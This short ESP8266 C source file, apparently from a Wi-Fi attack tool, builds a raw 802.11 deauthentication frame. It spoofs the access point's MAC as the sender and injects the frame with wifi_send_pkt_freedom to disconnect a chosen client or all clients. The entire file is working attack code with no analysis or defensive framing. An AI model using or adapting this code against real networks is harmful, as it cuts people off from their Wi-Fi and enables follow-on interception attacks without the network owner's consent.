#include "atk.h"
#include <ESP8266WiFi.h>
//#include <ESP8266WiFiGeneric.h>

extern uint8_t deauthTemplate[26] = {
  /*  0 - 1  */ 0xC0, 0x00,                          // type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00,                          // duration (SDK takes care of that)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00,                          // fragment & squence number
  /* 24 - 25 */ 0x01, 0x00                           // reason code (1 = unspecified reason)
};


void sendDeauthPacket(AccessPoint* data, uint8_t mtarget[6]) {

  uint8_t frame[26];  //frame to send

  memcpy(frame, &deauthTemplate, sizeof(deauthTemplate));  // setting frame to deauth
  memcpy(&frame[4], mtarget, 6);                           // set target to deauth
  memcpy(&frame[10], data->mac, 6);                        // set bssid of ap
  memcpy(&frame[16], data->mac, 6);                        // set bssid of ap

  wifi_set_channel(data->channel);  // nedded to deauth target
  delay(0);                         // reset wifi
  //wifi_send_pkt_freedom(frame, sizeof(frame), 0);
  Serial.print((wifi_send_pkt_freedom(frame, sizeof(frame), 0) != 0)?"Deauthed: Fail!\n":"Deauthed: Pass!\n"); // sending frame
}
//